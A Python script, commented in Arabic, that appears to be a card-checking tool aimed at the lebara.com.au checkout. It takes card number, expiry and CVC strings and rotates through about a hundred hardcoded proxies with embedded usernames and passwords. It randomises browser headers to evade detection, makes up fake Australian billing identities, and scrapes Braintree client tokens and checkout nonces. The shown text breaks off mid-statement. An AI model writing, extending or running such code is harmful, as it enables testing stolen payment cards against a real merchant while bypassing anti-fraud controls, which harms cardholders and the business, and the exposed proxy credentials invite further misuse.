# ==================== gatet.py (مع البروكسيات - لموقع lebara.com.au) ====================

import requests, json, re, random, sys, os, time, base64, uuid
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
import string

# ==================== قائمة البروكسيات ====================
PROXIES_LIST = [
    {'http': 'http://purevpn0s11340994:ak3t35fp@px051703.pointtoserver.com:10780', 'https': 'http://purevpn0s11340994:ak3t35fp@px051703.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s11340994:ak3t35fp@px591801.pointtoserver.com:10780', 'https': 'http://purevpn0s11340994:ak3t35fp@px591801.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s11340994:ak3t35fp@px022505.pointtoserver.com:10780', 'https': 'http://purevpn0s11340994:ak3t35fp@px022505.pointtoserver.com:10780'},
    {'http': 'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@bg-sof.pvdata.host:8080', 'https': 'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@bg-sof.pvdata.host:8080'},
    {'http': 'http://purevpn0s11340994:ak3t35fp@px041202.pointtoserver.com:10780', 'https': 'http://purevpn0s11340994:ak3t35fp@px041202.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s11340994:ak3t35fp@px1260303.pointtoserver.com:10780', 'https': 'http://purevpn0s11340994:ak3t35fp@px1260303.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s13628768:vecnnovx@px1260303.pointtoserver.com:10780', 'https': 'http://purevpn0s13628768:vecnnovx@px1260303.pointtoserver.com:10780'},
    {'http': 'http://OR1673915314:LMf4JcDV@208.196.99.128:8813', 'https': 'http://OR1673915314:LMf4JcDV@208.196.99.128:8813'},
    {'http': 'http://purevpn0s2232045:hww8fqbr72j0@px031901.pointtoserver.com:10780', 'https': 'http://purevpn0s2232045:hww8fqbr72j0@px031901.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s11383538:43z2vhwa@px591801.pointtoserver.com:10780', 'https': 'http://purevpn0s11383538:43z2vhwa@px591801.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s2232045:hww8fqbr72j0@px015601.pointtoserver.com:10780', 'https': 'http://purevpn0s2232045:hww8fqbr72j0@px015601.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s11383538:43z2vhwa@px013403.pointtoserver.com:10780', 'https': 'http://purevpn0s11383538:43z2vhwa@px013403.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s2232045:hww8fqbr72j0@px013401.pointtoserver.com:10780', 'https': 'http://purevpn0s2232045:hww8fqbr72j0@px013401.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s12153504:1LTpwxbCJbEdXo@px043006.pointtoserver.com:10780', 'https': 'http://purevpn0s12153504:1LTpwxbCJbEdXo@px043006.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s2232045:hww8fqbr72j0@px023005.pointtoserver.com:10780', 'https': 'http://purevpn0s2232045:hww8fqbr72j0@px023005.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s13628768:vecnnovx@px022505.pointtoserver.com:10780', 'https': 'http://purevpn0s13628768:vecnnovx@px022505.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s8732217:i67s60ep@px870303.pointtoserver.com:10780', 'https': 'http://purevpn0s8732217:i67s60ep@px870303.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s8732217:i67s60ep@px022409.pointtoserver.com:10780', 'https': 'http://purevpn0s8732217:i67s60ep@px022409.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s11340994:ak3t35fp@px490401.pointtoserver.com:10780', 'https': 'http://purevpn0s11340994:ak3t35fp@px490401.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s8732217:i67s60ep@px043005.pointtoserver.com:10780', 'https': 'http://purevpn0s8732217:i67s60ep@px043005.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s11383538:43z2vhwa@px031901.pointtoserver.com:10780', 'https': 'http://purevpn0s11383538:43z2vhwa@px031901.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s12153504:1LTpwxbCJbEdXo@px041202.pointtoserver.com:10780', 'https': 'http://purevpn0s12153504:1LTpwxbCJbEdXo@px041202.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s11383538:43z2vhwa@px960206.pointtoserver.com:10780', 'https': 'http://purevpn0s11383538:43z2vhwa@px960206.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s12153504:1LTpwxbCJbEdXo@px490402.pointtoserver.com:10780', 'https': 'http://purevpn0s12153504:1LTpwxbCJbEdXo@px490402.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s13628768:vecnnovx@px015601.pointtoserver.com:10780', 'https': 'http://purevpn0s13628768:vecnnovx@px015601.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s8732217:i67s60ep@px040805.pointtoserver.com:10780', 'https': 'http://purevpn0s8732217:i67s60ep@px040805.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s7397024:6CU9ZvexLGTqpB@px019603.pointtoserver.com:10780', 'https': 'http://purevpn0s7397024:6CU9ZvexLGTqpB@px019603.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s13628768:vecnnovx@px960206.pointtoserver.com:10780', 'https': 'http://purevpn0s13628768:vecnnovx@px960206.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s13628768:vecnnovx@px019603.pointtoserver.com:10780', 'https': 'http://purevpn0s13628768:vecnnovx@px019603.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s8732217:i67s60ep@px410701.pointtoserver.com:10780', 'https': 'http://purevpn0s8732217:i67s60ep@px410701.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s7397024:6CU9ZvexLGTqpB@px013401.pointtoserver.com:10780', 'https': 'http://purevpn0s7397024:6CU9ZvexLGTqpB@px013401.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s11340994:ak3t35fp@px015601.pointtoserver.com:10780', 'https': 'http://purevpn0s11340994:ak3t35fp@px015601.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s7397024:6CU9ZvexLGTqpB@px400501.pointtoserver.com:10780', 'https': 'http://purevpn0s7397024:6CU9ZvexLGTqpB@px400501.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s8732217:i67s60ep@px1260303.pointtoserver.com:10780', 'https': 'http://purevpn0s8732217:i67s60ep@px1260303.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s7397024:6CU9ZvexLGTqpB@px490401.pointtoserver.com:10780', 'https': 'http://purevpn0s7397024:6CU9ZvexLGTqpB@px490401.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s13628768:vecnnovx@px041202.pointtoserver.com:10780', 'https': 'http://purevpn0s13628768:vecnnovx@px041202.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s8732217:i67s60ep@px013403.pointtoserver.com:10780', 'https': 'http://purevpn0s8732217:i67s60ep@px013403.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s8732217:i67s60ep@px051703.pointtoserver.com:10780', 'https': 'http://purevpn0s8732217:i67s60ep@px051703.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s2232045:hww8fqbr72j0@px041202.pointtoserver.com:10780', 'https': 'http://purevpn0s2232045:hww8fqbr72j0@px041202.pointtoserver.com:10780'},
    {'http': 'http://socialwire:87xb2kziRk4xa@153.121.71.115:822', 'https': 'http://socialwire:87xb2kziRk4xa@153.121.71.115:822'},
    {'http': 'http://purevpn0s2232045:hww8fqbr72j0@px032002.pointtoserver.com:10780', 'https': 'http://purevpn0s2232045:hww8fqbr72j0@px032002.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s7397024:6CU9ZvexLGTqpB@px520401.pointtoserver.com:10780', 'https': 'http://purevpn0s7397024:6CU9ZvexLGTqpB@px520401.pointtoserver.com:10780'},
    {'http': 'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@at-wie.pvdata.host:8080', 'https': 'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@at-wie.pvdata.host:8080'},
    {'http': 'http://purevpn0s11383538:43z2vhwa@px490402.pointtoserver.com:10780', 'https': 'http://purevpn0s11383538:43z2vhwa@px490402.pointtoserver.com:10780'},
    {'http': 'http://llewellynashleybowen:rNXaRJfNPN233zw@136.179.19.164:3128', 'https': 'http://llewellynashleybowen:rNXaRJfNPN233zw@136.179.19.164:3128'},
    {'http': 'http://purevpn0s7397024:6CU9ZvexLGTqpB@px013403.pointtoserver.com:10780', 'https': 'http://purevpn0s7397024:6CU9ZvexLGTqpB@px013403.pointtoserver.com:10780'},
    {'http': 'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@kr-seo.pvdata.host:8080', 'https': 'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@kr-seo.pvdata.host:8080'},
    {'http': 'http://purevpn0s8732217:i67s60ep@px013302.pointtoserver.com:10780', 'https': 'http://purevpn0s8732217:i67s60ep@px013302.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s2232045:hww8fqbr72j0@px022505.pointtoserver.com:10780', 'https': 'http://purevpn0s2232045:hww8fqbr72j0@px022505.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s11383538:43z2vhwa@px016104.pointtoserver.com:10780', 'https': 'http://purevpn0s11383538:43z2vhwa@px016104.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s11340994:ak3t35fp@px023005.pointtoserver.com:10780', 'https': 'http://purevpn0s11340994:ak3t35fp@px023005.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s8732217:i67s60ep@px051003.pointtoserver.com:10780', 'https': 'http://purevpn0s8732217:i67s60ep@px051003.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s2232045:hww8fqbr72j0@px043005.pointtoserver.com:10780', 'https': 'http://purevpn0s2232045:hww8fqbr72j0@px043005.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s13628768:vecnnovx@px040805.pointtoserver.com:10780', 'https': 'http://purevpn0s13628768:vecnnovx@px040805.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s13628768:vecnnovx@px013302.pointtoserver.com:10780', 'https': 'http://purevpn0s13628768:vecnnovx@px013302.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s11383538:43z2vhwa@px870303.pointtoserver.com:10780', 'https': 'http://purevpn0s11383538:43z2vhwa@px870303.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s11383538:43z2vhwa@px022505.pointtoserver.com:10780', 'https': 'http://purevpn0s11383538:43z2vhwa@px022505.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s11340994:ak3t35fp@px380101.pointtoserver.com:10780', 'https': 'http://purevpn0s11340994:ak3t35fp@px380101.pointtoserver.com:10780'},
    {'http': 'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@fr-par.pvdata.host:8080', 'https': 'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@fr-par.pvdata.host:8080'},
    {'http': 'http://purevpn0s11383538:43z2vhwa@px1260303.pointtoserver.com:10780', 'https': 'http://purevpn0s11383538:43z2vhwa@px1260303.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s8732217:i67s60ep@px023005.pointtoserver.com:10780', 'https': 'http://purevpn0s8732217:i67s60ep@px023005.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s11383538:43z2vhwa@px400501.pointtoserver.com:10780', 'https': 'http://purevpn0s11383538:43z2vhwa@px400501.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s7397024:6CU9ZvexLGTqpB@px014004.pointtoserver.com:10780', 'https': 'http://purevpn0s7397024:6CU9ZvexLGTqpB@px014004.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s11340994:ak3t35fp@px013302.pointtoserver.com:10780', 'https': 'http://purevpn0s11340994:ak3t35fp@px013302.pointtoserver.com:10780'},
    {'http': 'http://naveed:Qwerty_123ABC@103.204.108.142:12345', 'https': 'http://naveed:Qwerty_123ABC@103.204.108.142:12345'},
    {'http': 'http://purevpn0s11383538:43z2vhwa@px022408.pointtoserver.com:10780', 'https': 'http://purevpn0s11383538:43z2vhwa@px022408.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s11340994:ak3t35fp@px470108.pointtoserver.com:10780', 'https': 'http://purevpn0s11340994:ak3t35fp@px470108.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s13628768:vecnnovx@px051003.pointtoserver.com:10780', 'https': 'http://purevpn0s13628768:vecnnovx@px051003.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s8732217:i67s60ep@px520401.pointtoserver.com:10780', 'https': 'http://purevpn0s8732217:i67s60ep@px520401.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s11340994:ak3t35fp@px420602.pointtoserver.com:10780', 'https': 'http://purevpn0s11340994:ak3t35fp@px420602.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s7397024:6CU9ZvexLGTqpB@px022408.pointtoserver.com:10780', 'https': 'http://purevpn0s7397024:6CU9ZvexLGTqpB@px022408.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s7397024:6CU9ZvexLGTqpB@px022409.pointtoserver.com:10780', 'https': 'http://purevpn0s7397024:6CU9ZvexLGTqpB@px022409.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s11340994:ak3t35fp@px022408.pointtoserver.com:10780', 'https': 'http://purevpn0s11340994:ak3t35fp@px022408.pointtoserver.com:10780'},
    {'http': 'http://harishankarchoubey:HvCjWdoIrK6szj8v@136.179.19.164:3128', 'https': 'http://harishankarchoubey:HvCjWdoIrK6szj8v@136.179.19.164:3128'},
    {'http': 'http://purevpn0s2232045:hww8fqbr72j0@px051005.pointtoserver.com:10780', 'https': 'http://purevpn0s2232045:hww8fqbr72j0@px051005.pointtoserver.com:10780'},
    {'http': 'http://yjrdrwwc:tauesbfb@us2.cactussstp.com:8080', 'https': 'http://yjrdrwwc:tauesbfb@us2.cactussstp.com:8080'},
    {'http': 'http://purevpn0s13628768:vecnnovx@px051005.pointtoserver.com:10780', 'https': 'http://purevpn0s13628768:vecnnovx@px051005.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s11340994:ak3t35fp@px173003.pointtoserver.com:10780', 'https': 'http://purevpn0s11340994:ak3t35fp@px173003.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s11340994:ak3t35fp@px460101.pointtoserver.com:10780', 'https': 'http://purevpn0s11340994:ak3t35fp@px460101.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s2232045:hww8fqbr72j0@px040805.pointtoserver.com:10780', 'https': 'http://purevpn0s2232045:hww8fqbr72j0@px040805.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s11383538:43z2vhwa@px051005.pointtoserver.com:10780', 'https': 'http://purevpn0s11383538:43z2vhwa@px051005.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s13628768:vecnnovx@px420602.pointtoserver.com:10780', 'https': 'http://purevpn0s13628768:vecnnovx@px420602.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s2232045:hww8fqbr72j0@px032004.pointtoserver.com:10780', 'https': 'http://purevpn0s2232045:hww8fqbr72j0@px032004.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s2232045:hww8fqbr72j0@px400501.pointtoserver.com:10780', 'https': 'http://purevpn0s2232045:hww8fqbr72j0@px400501.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s7397024:6CU9ZvexLGTqpB@px041202.pointtoserver.com:10780', 'https': 'http://purevpn0s7397024:6CU9ZvexLGTqpB@px041202.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s8732217:i67s60ep@px043006.pointtoserver.com:10780', 'https': 'http://purevpn0s8732217:i67s60ep@px043006.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s7397024:6CU9ZvexLGTqpB@px022505.pointtoserver.com:10780', 'https': 'http://purevpn0s7397024:6CU9ZvexLGTqpB@px022505.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s7397024:6CU9ZvexLGTqpB@px460101.pointtoserver.com:10780', 'https': 'http://purevpn0s7397024:6CU9ZvexLGTqpB@px460101.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s8732217:i67s60ep@px016104.pointtoserver.com:10780', 'https': 'http://purevpn0s8732217:i67s60ep@px016104.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s2232045:hww8fqbr72j0@px013301.pointtoserver.com:10780', 'https': 'http://purevpn0s2232045:hww8fqbr72j0@px013301.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s2232045:hww8fqbr72j0@px960206.pointtoserver.com:10780', 'https': 'http://purevpn0s2232045:hww8fqbr72j0@px960206.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s2232045:hww8fqbr72j0@px380101.pointtoserver.com:10780', 'https': 'http://purevpn0s2232045:hww8fqbr72j0@px380101.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s13628768:vecnnovx@px180801.pointtoserver.com:10780', 'https': 'http://purevpn0s13628768:vecnnovx@px180801.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s8732217:i67s60ep@px051005.pointtoserver.com:10780', 'https': 'http://purevpn0s8732217:i67s60ep@px051005.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s8732217:i67s60ep@px490401.pointtoserver.com:10780', 'https': 'http://purevpn0s8732217:i67s60ep@px490401.pointtoserver.com:10780'},
    {'http': 'http://purevpn0s8732217:i67s60ep@px470108.pointtoserver.com:10780', 'https': 'http://purevpn0s8732217:i67s60ep@px470108.pointtoserver.com:10780'},
]

def get_random_proxy():
    """إرجاع بروكسي عشوائي من القائمة"""
    return random.choice(PROXIES_LIST)

def get_random_headers():
    """توليد هيدرز عشوائية بالكامل"""
    
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
        'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 Version/15.0 Mobile/15E148 Safari/604.1'
    ]
    
    accept_languages = [
        'en-US,en;q=0.9', 'en-GB,en;q=0.8', 'en-CA,en;q=0.7', 
        'en-AU,en;q=0.6', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.8'
    ]
    
    sec_ch_ua = [
        '"Chromium";v="120", "Not_A Brand";v="99"',
        '"Chromium";v="121", "Not;A=Brand";v="99"',
        '"Google Chrome";v="120", "Not_A Brand";v="99"',
        '"Google Chrome";v="121", "Not;A=Brand";v="99"'
    ]
    
    return {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': random.choice(accept_languages),
        'cache-control': 'max-age=0',
        'sec-ch-ua': random.choice(sec_ch_ua),
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': random.choice(['"Android"', '"iOS"', '"Windows"', '"macOS"']),
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
    }

def clean_html(text):
    if not text:
        return ""
    clean = re.sub(r'<[^>]+>', ' ', text)
    clean = re.sub(r'\s+', ' ', clean)
    return clean.strip().lower()

def extract_reason(text):
    match = re.search(r'reason:\s*(.+?)(?:\.\s|$|<|$)', text, re.IGNORECASE)
    if match:
        return match.group(1).strip()
    return None

def generate_valid_email():
    """توليد إيميل صالح بنطاقات مختلفة"""
    domains = [
        'gmail.com', 'outlook.com', 'yahoo.com', 'hotmail.com',
        'icloud.com', 'protonmail.com', 'mail.com', 'yandex.com'
    ]
    
    names = [
        'james', 'emma', 'oliver', 'amelia', 'jack', 'olivia', 'harry', 'charlotte', 'william', 'mia',
        'thomas', 'isabella', 'noah', 'sophia', 'liam', 'grace', 'ethan', 'chloe', 'lucas', 'zoe'
    ]
    
    name1 = random.choice(names)
    name2 = random.choice(names)
    number = random.randint(1, 9999)
    domain = random.choice(domains)
    
    formats = [
        f"{name1}.{name2}{number}@{domain}",
        f"{name1}{number}@{domain}",
        f"{name1}_{name2}{number}@{domain}",
        f"{name1}{name2}{number}@{domain}",
    ]
    
    email = random.choice(formats)
    return email.lower()

def generate_realistic_au_data():
    """توليد بيانات أسترالية حقيقية"""
    
    first_names = ['James', 'Emma', 'Oliver', 'Amelia', 'Jack', 'Olivia', 'Harry', 'Charlotte', 'William', 'Mia',
                   'Thomas', 'Isabella', 'Noah', 'Sophia', 'Liam', 'Grace', 'Ethan', 'Chloe', 'Lucas', 'Zoe']
    
    last_names = ['Smith', 'Jones', 'Williams', 'Brown', 'Wilson', 'Taylor', 'Johnson', 'White', 'Martin', 'Anderson',
                  'Thompson', 'Nguyen', 'Thomas', 'Walker', 'Robinson', 'Kelly', 'Wright', 'Green', 'Hall', 'Harris']
    
    first = random.choice(first_names)
    last = random.choice(last_names)
    
    cities_postcodes = [
        ('Sydney', '2000'), ('Melbourne', '3000'), ('Brisbane', '4000'), ('Perth', '6000'),
        ('Adelaide', '5000'), ('Gold Coast', '4217'), ('Canberra', '2600'), ('Newcastle', '2300'),
        ('Wollongong', '2500'), ('Hobart', '7000'), ('Darwin', '8000'), ('Geelong', '3220'),
        ('Townsville', '4810'), ('Cairns', '4870'), ('Toowoomba', '4350'), ('Ballarat', '3350')
    ]
    
    streets = ['George Street', 'Elizabeth Street', 'King Street', 'Queen Street', 'Victoria Road',
               'Oxford Street', 'Brunswick Street', 'Chapel Street', 'Glenferrie Road', 'Burwood Road',
               'High Street', 'Main Street', 'Beach Road', 'Anzac Parade', 'Pacific Highway']
    
    city, postcode = random.choice(cities_postcodes)
    street = random.choice(streets)
    house_number = random.randint(1, 250)
    full_address = f"{house_number} {street}"
    
    phones = ['0412345678', '0423456789', '0434567890', '0445678901', '0456789012', '0467890123']
    companies = ['Telstra', 'Optus', 'Vodafone', 'Woolworths', 'Coles', 'CBA', 'Westpac', 'NAB', 'ANZ']
    
    email = generate_valid_email()
    
    return {
        'first_name': first,
        'last_name': last,
        'email': email,
        'phone': random.choice(phones),
        'address_1': full_address,
        'city': city,
        'postcode': postcode,
        'state': random.choice(['NSW', 'VIC', 'QLD', 'WA', 'SA', 'TAS', 'ACT']),
        'company': random.choice(companies) if random.choice([True, False]) else ''
    }

def ch(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    
    if len(yy) == 2:
        yy = '20' + yy
    
    max_retries = 2
    last_error = None
    
    for attempt in range(max_retries):
        
        proxy = get_random_proxy()
        proxy_ip = proxy['http'].split('@')[-1].split(':')[0] if '@' in proxy['http'] else 'unknown'
        
        dynamic_headers = get_random_headers()
        user = dynamic_headers['user-agent'] if 'user-agent' in dynamic_headers else generate_user_agent()
        
        fake_data = generate_realistic_au_data()
        session_id = str(uuid.uuid4())
        correlation_id = str(uuid.uuid4())[:24]
        
        r = requests.session()
        r.proxies = proxy
        r.verify = False
        
        print(f"[*] Attempt {attempt+1}/{max_retries} - Using proxy: {proxy_ip}")
        print(f"[*] Email used: {fake_data['email']}")
        
        SITE_URL = 'https://www.lebara.com.au'
        PRODUCT_URL = 'https://www.lebara.com.au/prepaid-plans/deals/'
        CHECKOUT_URL = 'https://www.lebara.com.au/checkout/'
        AJAX_URL = 'https://www.lebara.com.au/'
        
        time.sleep(random.uniform(5, 10))
        
        try:
            # ================ 1. ADD TO CART ================
            cookies_add = {
                'swpext86386': 'f8d93f630e96df7d0f9a366a7d7cf040',
            }
            
            files = {
                'add-to-cart': (None, '559633'),
                'product_id': (None, '559633'),
                'quantity': (None, '1'),
            }
            
            headers_add = {
                'authority': 'www.lebara.com.au',
                'accept': dynamic_headers['accept'],
                'accept-language': dynamic_headers['accept-language'],
                'origin': SITE_URL,
                'referer': PRODUCT_URL,
                'user-agent': user,
                'upgrade-insecure-requests': '1',
                'sec-ch-ua': dynamic_headers['sec-ch-ua'],
                'sec-ch-ua-mobile': dynamic_headers['sec-ch-ua-mobile'],
                'sec-ch-ua-platform': dynamic_headers['sec-ch-ua-platform'],
                'Connection': 'close',
            }
            
            response = r.post(PRODUCT_URL, headers=headers_add, files=files, cookies=cookies_add, timeout=30)
            if response.status_code != 200:
                print(f"[!] Add to cart failed with proxy {proxy_ip}, retrying...")
                continue
            
            time.sleep(random.uniform(3, 6))
            
            # ================ 2. CHECKOUT PAGE ================
            cookies_checkout = {
                'woocommerce_items_in_cart': '1',
                'woocommerce_cart_hash': 'c500f5aa44a187006446bad84238569d',
                'wp_woocommerce_session_74a7c7c1c7d41e8337eac97ea28a85dd': 't_50ff4592f1a7abee174a87a58b97f8%7C1779784917%7C1779698517%7C%24generic%24H-A13D6CzEJIebEgKLgQQdLHnEv40KM7wqXyOj-t',
            }
            
            headers_checkout = {
                'accept': dynamic_headers['accept'],
                'accept-language': dynamic_headers['accept-language'],
                'cache-control': 'max-age=0',
                'referer': PRODUCT_URL,
                'user-agent': user,
                'upgrade-insecure-requests': '1',
                'sec-ch-ua': dynamic_headers['sec-ch-ua'],
                'sec-ch-ua-mobile': dynamic_headers['sec-ch-ua-mobile'],
                'sec-ch-ua-platform': dynamic_headers['sec-ch-ua-platform'],
                'Connection': 'close',
            }
            
            response = r.get(CHECKOUT_URL, headers=headers_checkout, cookies=cookies_checkout, timeout=30)
            if response.status_code != 200:
                print(f"[!] Checkout page failed with proxy {proxy_ip}, retrying...")
                continue
            
            # ================ 3. EXTRACT TOKENS AND NONCES ================
            enc = None
            
            match = re.search(r'name="wc-braintree-client-token"\s+value="([^"]+)"', response.text)
            if match:
                enc = match.group(1)
            
            if not enc:
                match = re.search(r'data-braintree-client-token="([^"]+)"', response.text)
                if match:
                    enc = match.group(1)
            
            if not enc:
                match = re.search(r'wc_braintree_client_token\s*=\s*\["(.*?)"\]', response.text)
                if match:
                    enc = match.group(1)
            
            if not enc:
                print(f"[!] Client token not found with proxy {proxy_ip}, retrying...")
                continue
            
            dec = base64.b64decode(enc).decode('utf-8')
            au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
            if not au:
                print(f"[!] Fingerprint not found with proxy {proxy_ip}, retrying...")
                continue
            au = au[0]
            
            sec = re.search(r'update_order_review_nonce":"(.*?)"', response.text)
            if not sec:
                sec = '4e7d9045d4'
            else:
                sec = sec.group(1)
            
            check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text)
            if not check:
                check = 'ed2bf3e58c'
            else:
                check = check.group(1)
            
            time.sleep(random.uniform(2, 4))
            
            # ================ 4. UPDATE ORDER REVIEW ================
            billing_first = fake_data['first_name']
            billing_last = fake_data['last_name']
            billing_email = fake_data['email']
            billing_phone = fake_data['phone']
            billing_address = fake_data['address_1']
            billing_city = fake_data['city']
            billing_postcode = fake_data['postcode']
            billing_state = fake_data['state']
            
            cookies_update = {
                'woocommerce_items_in_cart': '1',
                'woocommerce_cart_hash': 'c500f5aa44a187006446bad84238569d',
                'wp_woocommerce_session_74a7c7c1c7d41e8337eac97ea28a85dd': 't_50ff4592f1a7abee174a87a58b97f8%7C1779784917%7C1779698517%7C%24generic%24H-A13D6CzEJIebEgKLgQQdLHnEv40KM7wqXyOj-t',
            }
            
            headers_update = {
                'accept': '*/*',
                'accept-language': dynamic_headers['accept-language'],
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': SITE_URL,
                'referer': CHECKOUT_URL,
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest',
                'sec-ch-ua': dynamic_headers['sec-ch-ua'],
                'sec-ch-ua-mobile': dynamic_headers['sec-ch-ua-mobile'],
                'sec-ch-ua-platform': dynamic_headers['sec-ch-ua-platform'],
                'Connection': 'close',
            }
            
            params_update = {'wc-ajax': 'update_order_review'}
            
            data_update = 